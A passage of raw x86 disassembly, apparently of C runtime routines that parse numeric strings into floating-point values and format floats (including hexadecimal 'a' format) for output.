  4260a9:	mov    DWORD PTR [ebp-0x54],eax
  4260ac:	mov    eax,DWORD PTR [ebp-0x4c]
  4260af:	cmp    cl,0x30
  4260b2:	jl     0x4260d9
  4260b4:	mov    esi,DWORD PTR [ebp-0x54]
  4260b7:	cmp    cl,0x39
  4260ba:	jg     0x4260d1
  4260bc:	cmp    eax,0x19
  4260bf:	jae    0x4260c9
  4260c1:	sub    cl,0x30
  4260c4:	inc    eax
  4260c5:	mov    BYTE PTR [edi],cl
  4260c7:	inc    edi
  4260c8:	dec    esi
  4260c9:	mov    cl,BYTE PTR [edx]
  4260cb:	inc    edx
  4260cc:	cmp    cl,0x30
  4260cf:	jge    0x4260b7
  4260d1:	mov    DWORD PTR [ebp-0x54],esi
  4260d4:	mov    esi,ebx
  4260d6:	mov    DWORD PTR [ebp-0x4c],eax
  4260d9:	cmp    cl,0x2b
  4260dc:	je     0x425fee
  4260e2:	cmp    cl,0x2d
  4260e5:	je     0x425fee
  4260eb:	cmp    cl,0x43
  4260ee:	jle    0x426105
  4260f0:	cmp    cl,0x45
  4260f3:	jle    0x425fe7
  4260f9:	sub    cl,0x64
  4260fc:	cmp    cl,0x1
  4260ff:	jbe    0x425fe7
  426105:	dec    edx
  426106:	jmp    0x426214
  42610b:	xor    eax,eax
  42610d:	sub    cl,0x30
  426110:	inc    eax
  426111:	mov    DWORD PTR [ebp-0x5c],eax
  426114:	cmp    cl,0x9
  426117:	ja     0x42601f
  42611d:	push   0x4
  42611f:	jmp    0x425f53
  426124:	lea    eax,[edx-0x2]
  426127:	mov    DWORD PTR [ebp-0x50],eax
  42612a:	lea    eax,[ecx-0x31]
  42612d:	cmp    al,0x8
  42612f:	ja     0x426138
  426131:	push   0x9
  426133:	jmp    0x425f53
  426138:	movsx  eax,cl
  42613b:	sub    eax,0x2b
  42613e:	je     0x426162
  426140:	dec    eax
  426141:	dec    eax
  426142:	je     0x426154
  426144:	sub    eax,0x3
  426147:	jne    0x42601f
  42614d:	push   0x8
  42614f:	jmp    0x425f6a
  426154:	push   0x7
  426156:	or     ecx,0xffffffff
  426159:	pop    eax
  42615a:	mov    DWORD PTR [ebp-0x6c],ecx
  42615d:	jmp    0x425f34
  426162:	push   0x7
  426164:	jmp    0x425f6a
  426169:	xor    eax,eax
  42616b:	inc    eax
  42616c:	mov    DWORD PTR [ebp-0x64],eax
  42616f:	jmp    0x426174
  426171:	mov    cl,BYTE PTR [edx]
  426173:	inc    edx
  426174:	cmp    cl,0x30
  426177:	je     0x426171
  426179:	sub    cl,0x31
  42617c:	cmp    cl,0x8
  42617f:	ja     0x426210
  426185:	jmp    0x426131
  426187:	lea    eax,[ecx-0x31]
  42618a:	cmp    al,0x8
  42618c:	jbe    0x426131
  42618e:	cmp    cl,0x30
  426191:	jmp    0x426147
  426193:	cmp    DWORD PTR [ebp+0x20],ebx
  426196:	je     0x4261ba
  426198:	lea    eax,[edx-0x1]
  42619b:	mov    DWORD PTR [ebp-0x50],eax
  42619e:	movsx  eax,cl
  4261a1:	sub    eax,0x2b
  4261a4:	je     0x426162
  4261a6:	dec    eax
  4261a7:	dec    eax
  4261a8:	jne    0x42601f
  4261ae:	or     DWORD PTR [ebp-0x6c],0xffffffff
  4261b2:	push   0x7
  4261b4:	pop    eax
  4261b5:	jmp    0x425f34
  4261ba:	push   0xa
  4261bc:	pop    eax
  4261bd:	dec    edx
  4261be:	cmp    eax,0xa
  4261c1:	jne    0x425f34
  4261c7:	jmp    0x426211
  4261c9:	xor    eax,eax
  4261cb:	mov    esi,ebx
  4261cd:	inc    eax
  4261ce:	mov    DWORD PTR [ebp-0x64],eax
  4261d1:	jmp    0x4261f2
  4261d3:	cmp    cl,0x39
  4261d6:	jg     0x42620b
  4261d8:	imul   ecx,esi,0xa
  4261db:	movsx  esi,BYTE PTR [ebp-0x55]
  4261df:	add    esi,0xffffffd0
  4261e2:	add    esi,ecx
  4261e4:	cmp    esi,0x1450
  4261ea:	jg     0x4261f9
  4261ec:	mov    cl,BYTE PTR [edx]
  4261ee:	inc    edx
  4261ef:	mov    BYTE PTR [ebp-0x55],cl
  4261f2:	cmp    cl,0x30
  4261f5:	jge    0x4261d3
  4261f7:	jmp    0x42620b
  4261f9:	mov    cl,BYTE PTR [ebp-0x55]
  4261fc:	mov    esi,0x1451
  426201:	jmp    0x42620b
  426203:	cmp    cl,0x39
  426206:	jg     0x426210
  426208:	mov    cl,BYTE PTR [edx]
  42620a:	inc    edx
  42620b:	cmp    cl,0x30
  42620e:	jge    0x426203
  426210:	dec    edx
  426211:	mov    eax,DWORD PTR [ebp-0x4c]
  426214:	mov    ecx,DWORD PTR [ebp-0x68]
  426217:	mov    DWORD PTR [ecx],edx
  426219:	mov    ecx,DWORD PTR [ebp-0x60]
  42621c:	test   ecx,ecx
  42621e:	je     0x4265fb
  426224:	cmp    eax,0x18
  426227:	jbe    0x426242
  426229:	mov    al,BYTE PTR [ebp-0x9]
  42622c:	cmp    al,0x5
  42622e:	jl     0x426235
  426230:	inc    al
  426232:	mov    BYTE PTR [ebp-0x9],al
  426235:	mov    ecx,DWORD PTR [ebp-0x54]
  426238:	dec    edi
  426239:	push   0x18
  42623b:	inc    ecx
  42623c:	pop    eax
  42623d:	mov    DWORD PTR [ebp-0x54],ecx
  426240:	jmp    0x426245
  426242:	mov    ecx,DWORD PTR [ebp-0x54]
  426245:	test   eax,eax
  426247:	je     0x4265f1
  42624d:	dec    edi
  42624e:	cmp    BYTE PTR [edi],bl
  426250:	jne    0x42625c
  426252:	dec    eax
  426253:	inc    ecx
  426254:	dec    edi
  426255:	cmp    BYTE PTR [edi],bl
  426257:	je     0x426252
  426259:	mov    DWORD PTR [ebp-0x54],ecx
  42625c:	lea    ecx,[ebp-0x3c]
  42625f:	push   ecx
  426260:	push   eax
  426261:	lea    eax,[ebp-0x20]
  426264:	push   eax
  426265:	call   0x427121
  42626a:	mov    ecx,DWORD PTR [ebp-0x6c]
  42626d:	add    esp,0xc
  426270:	test   ecx,ecx
  426272:	jns    0x426276
  426274:	neg    esi
  426276:	add    esi,DWORD PTR [ebp-0x54]
  426279:	mov    eax,DWORD PTR [ebp-0x64]
  42627c:	test   eax,eax
  42627e:	jne    0x426283
  426280:	add    esi,DWORD PTR [ebp+0x18]
  426283:	mov    eax,DWORD PTR [ebp-0x5c]
  426286:	test   eax,eax
  426288:	jne    0x42628d
  42628a:	sub    esi,DWORD PTR [ebp+0x1c]
  42628d:	cmp    esi,0x1450
  426293:	jg     0x4265e3
  426299:	cmp    esi,0xffffebb0
  42629f:	jl     0x4265d4
  4262a5:	mov    edx,0x4315e8
  4262aa:	sub    edx,0x60
  4262ad:	test   esi,esi
  4262af:	je     0x4265c2
  4262b5:	jns    0x4262c1
  4262b7:	mov    edx,0x431748
  4262bc:	neg    esi
  4262be:	sub    edx,0x60
  4262c1:	cmp    DWORD PTR [ebp+0x14],ebx
  4262c4:	jne    0x4265ba
  4262ca:	xor    eax,eax
  4262cc:	mov    WORD PTR [ebp-0x3c],ax
  4262d0:	jmp    0x4265ba
  4262d5:	mov    eax,esi
  4262d7:	add    edx,0x54
  4262da:	sar    esi,0x3
  4262dd:	mov    DWORD PTR [ebp-0x54],edx
  4262e0:	mov    DWORD PTR [ebp-0x4c],esi
  4262e3:	and    eax,0x7
  4262e6:	je     0x4265ba
  4262ec:	imul   ecx,eax,0xc
  4262ef:	mov    eax,0x8000
  4262f4:	add    ecx,edx
  4262f6:	mov    DWORD PTR [ebp-0x50],ecx
  4262f9:	cmp    WORD PTR [ecx],ax
  4262fc:	jb     0x42630f
  4262fe:	mov    esi,ecx
  426300:	lea    edi,[ebp-0x48]
  426303:	lea    ecx,[ebp-0x48]
  426306:	mov    DWORD PTR [ebp-0x50],ecx
  426309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42630a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42630b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42630c:	dec    DWORD PTR [ebp-0x46]
  42630f:	movzx  edi,WORD PTR [ecx+0xa]
  426313:	mov    edx,DWORD PTR [ebp-0x32]
  426316:	mov    eax,edi
  426318:	xor    eax,edx
  42631a:	mov    DWORD PTR [ebp-0x7c],ebx
  42631d:	and    eax,0x8000
  426322:	mov    DWORD PTR [ebp-0x2c],ebx
  426325:	mov    DWORD PTR [ebp-0x60],eax
  426328:	mov    eax,0x7fff
  42632d:	and    edx,eax
  42632f:	mov    DWORD PTR [ebp-0x28],ebx
  426332:	and    edi,eax
  426334:	mov    DWORD PTR [ebp-0x24],ebx
  426337:	lea    eax,[edi+edx*1]
  42633a:	movzx  esi,ax
  42633d:	mov    eax,0x7fff
  426342:	mov    DWORD PTR [ebp-0x6c],esi
  426345:	cmp    dx,ax
  426348:	jae    0x426597
  42634e:	cmp    di,ax
  426351:	jae    0x426597
  426357:	mov    eax,0xbffd
  42635c:	cmp    si,ax
  42635f:	ja     0x426597
  426365:	mov    eax,0x3fbf
  42636a:	cmp    si,ax
  42636d:	ja     0x426377
  42636f:	mov    DWORD PTR [ebp-0x34],ebx
  426372:	jmp    0x4265ae
  426377:	test   dx,dx
  42637a:	jne    0x4263a0
  42637c:	inc    esi
  42637d:	test   DWORD PTR [ebp-0x34],0x7fffffff
  426384:	mov    DWORD PTR [ebp-0x6c],esi
  426387:	jne    0x4263a0
  426389:	cmp    DWORD PTR [ebp-0x38],0x0
  42638d:	jne    0x4263a0
  42638f:	cmp    DWORD PTR [ebp-0x3c],0x0
  426393:	jne    0x4263a0
  426395:	xor    eax,eax
  426397:	mov    WORD PTR [ebp-0x32],ax
  42639b:	jmp    0x4265b4
  4263a0:	test   di,di
  4263a3:	jne    0x4263bb
  4263a5:	inc    esi
  4263a6:	test   DWORD PTR [ecx+0x8],0x7fffffff
  4263ad:	mov    DWORD PTR [ebp-0x6c],esi
  4263b0:	jne    0x4263bb
  4263b2:	cmp    DWORD PTR [ecx+0x4],ebx
  4263b5:	jne    0x4263bb
  4263b7:	cmp    DWORD PTR [ecx],ebx
  4263b9:	je     0x42636f
  4263bb:	push   0x5
  4263bd:	mov    eax,ebx
  4263bf:	lea    edx,[ebp-0x28]
  4263c2:	pop    edi
  4263c3:	mov    DWORD PTR [ebp-0x74],eax
  4263c6:	mov    DWORD PTR [ebp-0x68],edi
  4263c9:	mov    DWORD PTR [ebp-0x5c],edi
  4263cc:	test   edi,edi
  4263ce:	jle    0x426428
  4263d0:	lea    esi,[ebp-0x3c]
  4263d3:	lea    esi,[esi+eax*2]
  4263d6:	lea    eax,[ecx+0x8]
  4263d9:	mov    DWORD PTR [ebp-0x64],eax
  4263dc:	movzx  eax,WORD PTR [esi]
  4263df:	mov    DWORD PTR [ebp-0x5c],eax
  4263e2:	mov    eax,DWORD PTR [ebp-0x64]
  4263e5:	mov    ecx,DWORD PTR [ebp-0x5c]
  4263e8:	mov    DWORD PTR [ebp-0x78],ebx
  4263eb:	movzx  eax,WORD PTR [eax]
  4263ee:	imul   ecx,eax
  4263f1:	mov    DWORD PTR [ebp-0x5c],ecx
  4263f4:	add    ecx,DWORD PTR [edx-0x4]
  4263f7:	cmp    ecx,DWORD PTR [edx-0x4]
  4263fa:	jb     0x426401
  4263fc:	cmp    ecx,DWORD PTR [ebp-0x5c]
  4263ff:	jae    0x426406
  426401:	xor    eax,eax
  426403:	inc    eax
  426404:	jmp    0x426409
  426406:	mov    eax,DWORD PTR [ebp-0x78]
  426409:	mov    DWORD PTR [edx-0x4],ecx
  42640c:	test   eax,eax
  42640e:	je     0x426413
  426410:	inc    WORD PTR [edx]
  426413:	sub    DWORD PTR [ebp-0x64],0x2
  426417:	add    esi,0x2
  42641a:	dec    edi
  42641b:	test   edi,edi
  42641d:	jg     0x4263dc
  42641f:	mov    ecx,DWORD PTR [ebp-0x50]
  426422:	mov    edi,DWORD PTR [ebp-0x68]
  426425:	mov    eax,DWORD PTR [ebp-0x74]
  426428:	add    edx,0x2
  42642b:	inc    eax
  42642c:	dec    edi
  42642d:	mov    DWORD PTR [ebp-0x74],eax
  426430:	mov    DWORD PTR [ebp-0x68],edi
  426433:	test   edi,edi
  426435:	jg     0x4263c9
  426437:	mov    esi,DWORD PTR [ebp-0x6c]
  42643a:	mov    edx,DWORD PTR [ebp-0x24]
  42643d:	add    esi,0xc002
  426443:	mov    edi,DWORD PTR [ebp-0x2c]
  426446:	mov    DWORD PTR [ebp-0x50],edx
  426449:	test   si,si
  42644c:	jle    0x426489
  42644e:	test   edx,edx
  426450:	js     0x426484
  426452:	mov    eax,DWORD PTR [ebp-0x28]
  426455:	mov    edx,edi
  426457:	shr    edx,0x1f
  42645a:	mov    ecx,eax
  42645c:	add    eax,eax
  42645e:	shr    ecx,0x1f
  426461:	or     eax,edx
  426463:	add    edi,edi
  426465:	mov    edx,DWORD PTR [ebp-0x50]
  426468:	mov    DWORD PTR [ebp-0x28],eax
  42646b:	add    edx,edx
  42646d:	mov    eax,0xffff
  426472:	mov    DWORD PTR [ebp-0x2c],edi
  426475:	or     edx,ecx
  426477:	add    esi,eax
  426479:	mov    DWORD PTR [ebp-0x50],edx
  42647c:	mov    DWORD PTR [ebp-0x24],edx
  42647f:	test   si,si
  426482:	jg     0x42644e
  426484:	test   si,si
  426487:	jg     0x4264f2
  426489:	mov    eax,0xffff
  42648e:	add    esi,eax
  426490:	test   si,si
  426493:	jns    0x4264f2
  426495:	mov    ebx,DWORD PTR [ebp-0x7c]
  426498:	mov    eax,esi
  42649a:	neg    eax
  42649c:	movzx  eax,ax
  42649f:	mov    DWORD PTR [ebp-0x68],eax
  4264a2:	add    esi,eax
  4264a4:	test   BYTE PTR [ebp-0x2c],0x1
  4264a8:	je     0x4264ab
  4264aa:	inc    ebx
  4264ab:	mov    ecx,DWORD PTR [ebp-0x28]
  4264ae:	mov    eax,edx
  4264b0:	shl    eax,0x1f
  4264b3:	mov    DWORD PTR [ebp-0x50],ecx
  4264b6:	shr    DWORD PTR [ebp-0x50],1
  4264b9:	or     DWORD PTR [ebp-0x50],eax
  4264bc:	mov    eax,DWORD PTR [ebp-0x50]
  4264bf:	shl    ecx,0x1f
  4264c2:	shr    edi,1
  4264c4:	shr    edx,1
  4264c6:	or     edi,ecx
  4264c8:	dec    DWORD PTR [ebp-0x68]
  4264cb:	mov    DWORD PTR [ebp-0x24],edx
  4264ce:	mov    DWORD PTR [ebp-0x28],eax
  4264d1:	mov    DWORD PTR [ebp-0x2c],edi
  4264d4:	jne    0x4264a4
  4264d6:	push   0x0
  4264d8:	test   ebx,ebx
  4264da:	mov    DWORD PTR [ebp-0x50],edx
  4264dd:	pop    ebx
  4264de:	je     0x4264f2
  4264e0:	mov    ax,di
  4264e3:	xor    edi,edi
  4264e5:	inc    edi
  4264e6:	or     ax,di
  4264e9:	mov    WORD PTR [ebp-0x2c],ax
  4264ed:	mov    edi,DWORD PTR [ebp-0x2c]
  4264f0:	jmp    0x4264f6
  4264f2:	mov    ax,WORD PTR [ebp-0x2c]
  4264f6:	mov    edx,0x8000
  4264fb:	cmp    ax,dx
  4264fe:	ja     0x42650e
  426500:	and    edi,0x1ffff
  426506:	cmp    edi,0x18000
  42650c:	jne    0x42654e
  42650e:	mov    eax,DWORD PTR [ebp-0x2a]
  426511:	cmp    eax,0xffffffff
  426514:	jne    0x42654a
  426516:	mov    eax,DWORD PTR [ebp-0x26]
  426519:	mov    DWORD PTR [ebp-0x2a],ebx
  42651c:	cmp    eax,0xffffffff
  42651f:	jne    0x426541
  426521:	mov    ax,WORD PTR [ebp-0x22]
  426525:	mov    ecx,0xffff
  42652a:	mov    DWORD PTR [ebp-0x26],ebx
  42652d:	cmp    ax,cx
  426530:	jne    0x426539
  426532:	mov    WORD PTR [ebp-0x22],dx
  426536:	inc    esi
  426537:	jmp    0x426545
  426539:	inc    ax
  42653b:	mov    WORD PTR [ebp-0x22],ax
  42653f:	jmp    0x426545
  426541:	inc    eax
  426542:	mov    DWORD PTR [ebp-0x26],eax
  426545:	mov    ecx,DWORD PTR [ebp-0x24]
  426548:	jmp    0x426551
  42654a:	inc    eax
  42654b:	mov    DWORD PTR [ebp-0x2a],eax
  42654e:	mov    ecx,DWORD PTR [ebp-0x50]
  426551:	mov    edx,DWORD PTR [ebp-0x54]
  426554:	mov    eax,0x7fff
  426559:	cmp    si,ax
  42655c:	jb     0x42657d
  42655e:	xor    eax,eax
  426560:	mov    DWORD PTR [ebp-0x38],ebx
  426563:	cmp    WORD PTR [ebp-0x60],ax
  426567:	mov    DWORD PTR [ebp-0x3c],ebx
  42656a:	sete   al
  42656d:	dec    eax
  42656e:	and    eax,0x80000000
  426573:	add    eax,0x7fff8000
  426578:	mov    DWORD PTR [ebp-0x34],eax
  42657b:	jmp    0x4265b7
  42657d:	mov    ax,WORD PTR [ebp-0x2a]
  426581:	or     esi,DWORD PTR [ebp-0x60]
  426584:	mov    WORD PTR [ebp-0x3c],ax
  426588:	mov    eax,DWORD PTR [ebp-0x28]
  42658b:	mov    DWORD PTR [ebp-0x3a],eax
  42658e:	mov    DWORD PTR [ebp-0x36],ecx
  426591:	mov    WORD PTR [ebp-0x32],si
  426595:	jmp    0x4265b7
  426597:	xor    eax,eax
  426599:	cmp    WORD PTR [ebp-0x60],ax
  42659d:	sete   al
  4265a0:	dec    eax
  4265a1:	and    eax,0x80000000
  4265a6:	add    eax,0x7fff8000
  4265ab:	mov    DWORD PTR [ebp-0x34],eax
  4265ae:	mov    DWORD PTR [ebp-0x38],ebx
  4265b1:	mov    DWORD PTR [ebp-0x3c],ebx
  4265b4:	mov    edx,DWORD PTR [ebp-0x54]
  4265b7:	mov    esi,DWORD PTR [ebp-0x4c]
  4265ba:	test   esi,esi
  4265bc:	jne    0x4262d5
  4265c2:	mov    eax,DWORD PTR [ebp-0x34]
  4265c5:	movzx  ecx,WORD PTR [ebp-0x3c]
  4265c9:	mov    edx,DWORD PTR [ebp-0x3a]
  4265cc:	mov    esi,DWORD PTR [ebp-0x36]
  4265cf:	shr    eax,0x10
  4265d2:	jmp    0x426606
  4265d4:	xor    edi,edi
  4265d6:	mov    ecx,ebx
  4265d8:	mov    eax,ebx
  4265da:	mov    esi,ebx
  4265dc:	mov    edx,ebx
  4265de:	lea    ebx,[edi+0x1]
  4265e1:	jmp    0x426606
  4265e3:	mov    eax,0x7fff
  4265e8:	mov    esi,0x80000000
  4265ed:	push   0x2
  4265ef:	jmp    0x426601
  4265f1:	mov    ecx,ebx
  4265f3:	mov    eax,ebx
  4265f5:	mov    esi,ebx
  4265f7:	mov    edx,ebx
  4265f9:	jmp    0x426606
  4265fb:	mov    eax,ebx
  4265fd:	mov    esi,ebx
  4265ff:	push   0x4
  426601:	mov    ecx,ebx
  426603:	mov    edx,ebx
  426605:	pop    ebx
  426606:	mov    edi,DWORD PTR [ebp-0x80]
  426609:	or     eax,DWORD PTR [ebp-0x70]
  42660c:	mov    WORD PTR [edi+0xa],ax
  426610:	mov    eax,ebx
  426612:	mov    WORD PTR [edi],cx
  426615:	mov    DWORD PTR [edi+0x2],edx
  426618:	mov    DWORD PTR [edi+0x6],esi
  42661b:	mov    ecx,DWORD PTR [ebp-0x4]
  42661e:	pop    edi
  42661f:	pop    esi
  426620:	xor    ecx,ebp
  426622:	pop    ebx
  426623:	call   0x421878
  426628:	mov    esp,ebp
  42662a:	pop    ebp
  42662b:	ret    
  42662c:	dec    edx
  42662d:	pop    edi
  42662e:	inc    edx
  42662f:	add    BYTE PTR [edi+ebx*2+0x5ff60042],bl
  426636:	inc    edx
  426637:	add    BYTE PTR [edi],ah
  426639:	pusha  
  42663a:	inc    edx
  42663b:	add    BYTE PTR [eax+0xb004260],cl
  426641:	popa   
  426642:	inc    edx
  426643:	add    BYTE PTR [ecx+eiz*2],ah
  426646:	inc    edx
  426647:	add    BYTE PTR [edi+0x69004261],al
  42664d:	popa   
  42664e:	inc    edx
  42664f:	add    cl,cl
  426651:	popa   
  426652:	inc    edx
  426653:	add    BYTE PTR [esi-0x6cffbd9f],bh
  426659:	popa   
  42665a:	inc    edx
  42665b:	add    BYTE PTR [ebp-0x75],dl
  42665e:	in     al,dx
  42665f:	push   0x0
  426661:	push   DWORD PTR [ebp+0x1c]
  426664:	push   DWORD PTR [ebp+0x18]
  426667:	push   DWORD PTR [ebp+0x14]
  42666a:	push   DWORD PTR [ebp+0x10]
  42666d:	push   DWORD PTR [ebp+0xc]
  426670:	push   DWORD PTR [ebp+0x8]
  426673:	call   0x42667d
  426678:	add    esp,0x1c
  42667b:	pop    ebp
  42667c:	ret    
  42667d:	push   ebp
  42667e:	mov    ebp,esp
  426680:	mov    eax,DWORD PTR [ebp+0x14]
  426683:	cmp    eax,0x65
  426686:	je     0x4266e7
  426688:	cmp    eax,0x45
  42668b:	je     0x4266e7
  42668d:	cmp    eax,0x66
  426690:	jne    0x4266ab
  426692:	push   DWORD PTR [ebp+0x20]
  426695:	push   DWORD PTR [ebp+0x18]
  426698:	push   DWORD PTR [ebp+0x10]
  42669b:	push   DWORD PTR [ebp+0xc]
  42669e:	push   DWORD PTR [ebp+0x8]
  4266a1:	call   0x426d88
  4266a6:	add    esp,0x14
  4266a9:	pop    ebp
  4266aa:	ret    
  4266ab:	cmp    eax,0x61
  4266ae:	je     0x4266ce
  4266b0:	cmp    eax,0x41
  4266b3:	je     0x4266ce
  4266b5:	push   DWORD PTR [ebp+0x20]
  4266b8:	push   DWORD PTR [ebp+0x1c]
  4266bb:	push   DWORD PTR [ebp+0x18]
  4266be:	push   DWORD PTR [ebp+0x10]
  4266c1:	push   DWORD PTR [ebp+0xc]
  4266c4:	push   DWORD PTR [ebp+0x8]
  4266c7:	call   0x426e49
  4266cc:	jmp    0x4266fe
  4266ce:	push   DWORD PTR [ebp+0x20]
  4266d1:	push   DWORD PTR [ebp+0x1c]
  4266d4:	push   DWORD PTR [ebp+0x18]
  4266d7:	push   DWORD PTR [ebp+0x10]
  4266da:	push   DWORD PTR [ebp+0xc]
  4266dd:	push   DWORD PTR [ebp+0x8]
  4266e0:	call   0x426703
  4266e5:	jmp    0x4266fe
  4266e7:	push   DWORD PTR [ebp+0x20]
  4266ea:	push   DWORD PTR [ebp+0x1c]
  4266ed:	push   DWORD PTR [ebp+0x18]
  4266f0:	push   DWORD PTR [ebp+0x10]
  4266f3:	push   DWORD PTR [ebp+0xc]
  4266f6:	push   DWORD PTR [ebp+0x8]
  4266f9:	call   0x426bce
  4266fe:	add    esp,0x18
  426701:	pop    ebp
  426702:	ret    
  426703:	push   ebp
  426704:	mov    ebp,esp
  426706:	sub    esp,0x2c
  426709:	push   ebx
  42670a:	push   esi
  42670b:	push   edi
  42670c:	push   0x30
  42670e:	pop    eax
  42670f:	push   DWORD PTR [ebp+0x1c]
  426712:	mov    ecx,eax
  426714:	mov    DWORD PTR [ebp-0x8],0x3ff
  42671b:	mov    DWORD PTR [ebp-0x4],ecx
  42671e:	xor    ebx,ebx
  426720:	lea    ecx,[ebp-0x2c]
  426723:	call   0x4207b2
  426728:	mov    edi,DWORD PTR [ebp+0x14]
  42672b:	test   edi,edi
  42672d:	jns    0x426731
  42672f:	mov    edi,ebx
  426731:	mov    esi,DWORD PTR [ebp+0xc]
  426734:	test   esi,esi
  426736:	je     0x42673f
  426738:	mov    ecx,DWORD PTR [ebp+0x10]
  42673b:	test   ecx,ecx
  42673d:	jne    0x426748
  42673f:	call   0x41fb32
  426744:	push   0x16
  426746:	jmp    0x426758
  426748:	lea    eax,[edi+0xb]
  42674b:	mov    BYTE PTR [esi],bl
  42674d:	cmp    ecx,eax
  42674f:	ja     0x426765
  426751:	call   0x41fb32
  426756:	push   0x22
  426758:	pop    edi
  426759:	mov    DWORD PTR [eax],edi
  42675b:	call   0x422622
  426760:	jmp    0x426a49
  426765:	mov    edx,DWORD PTR [ebp+0x8]
  426768:	mov    eax,DWORD PTR [edx]
  42676a:	mov    ebx,DWORD PTR [edx+0x4]
  42676d:	mov    DWORD PTR [ebp-0x14],eax
  426770:	mov    eax,ebx
  426772:	shr    eax,0x14
  426775:	and    eax,0x7ff
  42677a:	cmp    eax,0x7ff
  42677f:	jne    0x4267fa
  426781:	xor    eax,eax
  426783:	cmp    eax,eax
  426785:	jne    0x4267fc
  426787:	or     eax,0xffffffff
  42678a:	cmp    ecx,eax
  42678c:	je     0x426791
  42678e:	lea    eax,[ecx-0x2]
  426791:	push   0x0
  426793:	push   edi
  426794:	push   eax
  426795:	lea    ebx,[esi+0x2]
  426798:	push   ebx
  426799:	push   edx
  42679a:	call   0x426a5f
  42679f:	mov    edi,eax
  4267a1:	add    esp,0x14
  4267a4:	test   edi,edi
  4267a6:	je     0x4267b0
  4267a8:	mov    BYTE PTR [esi],0x0
  4267ab:	jmp    0x426a49
  4267b0:	cmp    BYTE PTR [ebx],0x2d
  4267b3:	jne    0x4267b9
  4267b5:	mov    BYTE PTR [esi],0x2d
  4267b8:	inc    esi
  4267b9:	mov    edi,DWORD PTR [ebp+0x18]
  4267bc:	test   edi,edi
  4267be:	push   0x30
  4267c0:	pop    eax
  4267c1:	mov    BYTE PTR [esi],al
  4267c3:	sete   al
  4267c6:	dec    al
  4267c8:	and    al,0xe0
  4267ca:	add    al,0x78
  4267cc:	mov    BYTE PTR [esi+0x1],al
  4267cf:	lea    eax,[esi+0x2]
  4267d2:	push   0x65
  4267d4:	push   eax
  4267d5:	call   0x427b40
  4267da:	pop    ecx
  4267db:	pop    ecx
  4267dc:	test   eax,eax
  4267de:	je     0x4267f3
  4267e0:	test   edi,edi
  4267e2:	sete   cl
  4267e5:	dec    cl
  4267e7:	and    cl,0xe0
  4267ea:	add    cl,0x70
  4267ed:	mov    BYTE PTR [eax],cl
  4267ef:	mov    BYTE PTR [eax+0x3],0x0
  4267f3:	xor    edi,edi
  4267f5:	jmp    0x426a49
  4267fa:	xor    eax,eax
  4267fc:	and    ebx,0x80000000
  426802:	or     eax,ebx
  426804:	je     0x42680a
  426806:	mov    BYTE PTR [esi],0x2d
  426809:	inc    esi
  42680a:	cmp    DWORD PTR [ebp+0x18],0x0
  42680e:	mov    ebx,DWORD PTR [ebp+0x18]
  426811:	push   0x30
  426813:	pop    eax
  426814:	mov    BYTE PTR [esi],al
  426816:	sete   al
  426819:	dec    al
  42681b:	and    al,0xe0
  42681d:	add    al,0x78
  42681f:	neg    ebx
  426821:	mov    BYTE PTR [esi+0x1],al
  426824:	mov    ecx,DWORD PTR [edx+0x4]
  426827:	sbb    ebx,ebx
  426829:	and    ebx,0xffffffe0
  42682c:	and    ecx,0x7ff00000
  426832:	add    ebx,0x27
  426835:	xor    eax,eax
  426837:	or     eax,ecx
  426839:	mov    DWORD PTR [ebp-0x10],ebx
  42683c:	jne    0x426865
  42683e:	push   0x30
  426840:	pop    eax
  426841:	mov    BYTE PTR [esi+0x2],al
  426844:	add    esi,0x3
  426847:	mov    eax,DWORD PTR [edx+0x4]
  42684a:	mov    ecx,DWORD PTR [edx]
  42684c:	and    eax,0xfffff
  426851:	or     ecx,eax
  426853:	jne    0x42685c
  426855:	xor    eax,eax
  426857:	mov    DWORD PTR [ebp-0x8],eax
  42685a:	jmp    0x42686c
  42685c:	mov    DWORD PTR [ebp-0x8],0x3fe
  426863:	jmp    0x42686c
  426865:	mov    BYTE PTR [esi+0x2],0x31
  426869:	add    esi,0x3
  42686c:	mov    ecx,esi
  42686e:	inc    esi
  42686f:	mov    DWORD PTR [ebp-0xc],ecx
  426872:	test   edi,edi
  426874:	jne    0x42687b
  426876:	mov    BYTE PTR [ecx],0x0
  426879:	jmp    0x42688a
  42687b:	mov    eax,DWORD PTR [ebp-0x2c]
  42687e:	mov    eax,DWORD PTR [eax+0x84]
  426884:	mov    eax,DWORD PTR [eax]
  426886:	mov    al,BYTE PTR [eax]
  426888:	mov    BYTE PTR [ecx],al
  42688a:	mov    eax,DWORD PTR [edx+0x4]
  42688d:	and    eax,0xfffff
  426892:	mov    DWORD PTR [ebp-0x18],eax
  426895:	ja     0x4268a0
  426897:	cmp    DWORD PTR [edx],0x0
  42689a:	jbe    0x426962
  4268a0:	and    DWORD PTR [ebp+0x14],0x0
  4268a4:	mov    ecx,0xf0000
  4268a9:	mov    eax,DWORD PTR [ebp-0x4]
  4268ac:	mov    DWORD PTR [ebp+0xc],ecx
  4268af:	test   edi,edi
  4268b1:	jle    0x426906
  4268b3:	mov    eax,DWORD PTR [edx]
  4268b5:	mov    edx,DWORD PTR [edx+0x4]
  4268b8:	and    eax,DWORD PTR [ebp+0x14]
  4268bb:	and    edx,ecx
  4268bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4268c0:	and    edx,0xfffff
  4268c6:	movsx  ecx,cx
  4268c9:	call   0x427f60
  4268ce:	push   0x30
  4268d0:	pop    ecx
  4268d1:	add    ax,cx
  4268d4:	movzx  eax,ax
  4268d7:	cmp    eax,0x39
  4268da:	jbe    0x4268de
  4268dc:	add    eax,ebx
  4268de:	mov    ecx,DWORD PTR [ebp+0xc]
  4268e1:	mov    edx,DWORD PTR [ebp+0x8]
  4268e4:	mov    BYTE PTR [esi],al
  4268e6:	inc    esi
  4268e7:	mov    eax,DWORD PTR [ebp+0x14]
  4268ea:	shrd   eax,ecx,0x4
  4268ee:	mov    DWORD PTR [ebp+0x14],eax
  4268f1:	mov    eax,DWORD PTR [ebp-0x4]
  4268f4:	shr    ecx,0x4
  4268f7:	sub    eax,0x4
  4268fa:	dec    edi
  4268fb:	mov    DWORD PTR [ebp+0xc],ecx
  4268fe:	mov    DWORD PTR [ebp-0x4],eax
  426901:	test   ax,ax
  426904:	jns    0x4268af
  426906:	test   ax,ax
  426909:	js     0x426962
  42690b:	mov    eax,DWORD PTR [edx]
